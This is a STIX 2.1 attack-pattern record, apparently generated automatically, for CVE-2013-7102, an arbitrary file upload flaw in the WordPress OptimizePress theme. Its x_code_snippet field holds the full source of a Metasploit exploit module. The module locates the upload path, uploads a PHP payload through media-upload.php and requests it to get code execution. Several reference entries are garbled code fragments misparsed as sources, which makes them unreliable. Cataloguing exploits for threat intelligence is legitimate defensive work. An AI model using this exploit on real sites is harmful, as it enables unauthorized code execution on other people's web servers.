{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8d736784-0772-4b3a-8ffe-ab1ad73395d3",
    "created": "2024-08-14T17:13:20.892134Z",
    "modified": "2024-08-14T17:13:20.892141Z",
    "name": "WordPress OptimizePress Theme File Upload Vulnerability",
    "description": " This module exploits a vulnerability found in the WordPress theme OptimizePress. The vulnerability is due to an insecure file upload on the media-upload.php component, allowing an attacker to upload arbitrary PHP code. This module has been tested successfully on OptimizePress 1.45. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_optimizepress_upload.rb",
            "external_id": "wp_optimizepress_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-7102"
        },
        {
            "source_name": "reference",
            "url": "\"http://www.osirt.com/2013/11/wordpress-optimizepress-hack-file-upload-vulnerability/\""
        },
        {
            "source_name": "WPVDB",
            "external_id": "7441"
        },
        {
            "source_name": "fail_with(Failure::Unknown",
            "external_id": "\"#{peer}-UnabletoaccessvulnerableURL\")"
        },
        {
            "source_name": "fail_with(Failure::Unknown",
            "external_id": "\"#{peer}-UnabletoaccessvulnerableURL\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'uri'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'WordPress OptimizePress Theme File Upload Vulnerability',\n      'Description'     => %q{\n        This module exploits a vulnerability found in the WordPress theme OptimizePress. The\n        vulnerability is due to an insecure file upload on the media-upload.php component, allowing\n        an attacker to upload arbitrary PHP code. This module has been tested successfully on\n        OptimizePress 1.45.\n      },\n      'Author'          =>\n        [\n          'United of Muslim Cyber Army', # Vulnerability discovery\n          'Mekanismen' # Metasploit module\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          [ 'CVE', '2013-7102' ],\n          [ 'URL', \"http://www.osirt.com/2013/11/wordpress-optimizepress-hack-file-upload-vulnerability/\" ],\n          [ 'WPVDB', '7441' ]\n        ],\n      'Privileged'      => false,\n      'Platform'        => ['php'],\n      'Arch'            => ARCH_PHP,\n      'Targets'         => [ ['OptimizePress', {}] ],\n      'DefaultTarget'   => 0,\n      'DisclosureDate'  => '2013-11-29'\n    ))\n\n    register_advanced_options(\n      [\n        OptString.new('THEMEDIR', [ true, 'OptimizePress Theme directory', 'OptimizePress'])\n      ])\n  end\n\n  def check\n    uri = target_uri.path\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(uri, 'wp-content', 'themes', datastore['THEMEDIR'], 'lib', 'admin', 'media-upload.php')\n    })\n\n    if res and res.code == 200 and res.body.to_s =~ /Upload New Image/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    uri = normalize_uri(target_uri.path)\n\n    #get upload filepath\n    print_status(\"Getting the upload path...\")\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(uri, 'wp-content', 'themes', datastore['THEMEDIR'], 'lib', 'admin', 'media-upload.php')\n    })\n\n    unless res and res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Unable to access vulnerable URL\")\n    end\n\n    if res.body =~ /<input name=\"imgpath\" type=\"hidden\" id=\"imgpath\" value=\"(.*)\" \\/>/\n      file_path = $1\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unable to get upload filepath\")\n    end\n\n    #set cookie\n    cookie = res.get_cookies\n\n    filename = rand_text_alphanumeric(8) + \".php\"\n\n    #upload payload\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(\"<?php #{payload.encoded} ?>\", \"application/octet-stream\", nil, \"form-data; name=\\\"newcsimg\\\"; filename=\\\"#{filename}\\\"\")\n    post_data.add_part(\"Upload File\", nil, nil, \"form-data; name=\\\"button\\\"\")\n    post_data.add_part(\"1\", nil, nil, \"form-data; name=\\\"newcsimg\\\"\")\n    post_data.add_part(\"#{file_path}\", nil, nil, \"form-data; name=\\\"imgpath\\\"\")\n\n    print_status(\"Uploading PHP payload...\")\n\n    n_data = post_data.to_s\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, 'wp-content', 'themes', datastore['THEMEDIR'], 'lib', 'admin', 'media-upload.php'),\n      'ctype' => 'multipart/form-data; boundary=' + post_data.bound,\n      'data' => n_data,\n      'headers' => {\n        'Referer' => \"#{uri}/wp-content/themes/OptimizePress/lib/admin/media-upload.php\"\n      },\n      'cookie' => cookie\n    })\n\n    unless res and res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Unable to upload payload\")\n    end\n\n    print_good(\"Payload uploaded successfully. Disclosing the payload path...\")\n    #get path to payload\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(uri, 'wp-content', 'themes', datastore['THEMEDIR'], 'lib', 'admin', 'media-upload.php')\n    })\n\n    unless res and res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Unable to access vulnerable URL\")\n    end\n\n    payload_url = \"\"\n\n    if res.body =~ /name=\"cs_img\" value=\"(.*#{filename}.*)\" \\/> <span/\n      payload_url =$1\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unable to deliver the payload\")\n    end\n\n    begin\n      u = URI(payload_url)\n    rescue ::URI::InvalidURIError\n      fail_with(Failure::Unknown, \"#{peer} - Unable to deliver the payload, #{payload_url} isn't an URL'\")\n    end\n\n    register_files_for_cleanup(File::basename(u.path))\n\n    print_good(\"Our payload is at: #{u.path}! Executing payload...\")\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => u.path\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-11-29",
    "x_mitre_platforms": [
        "['php']"
    ]
}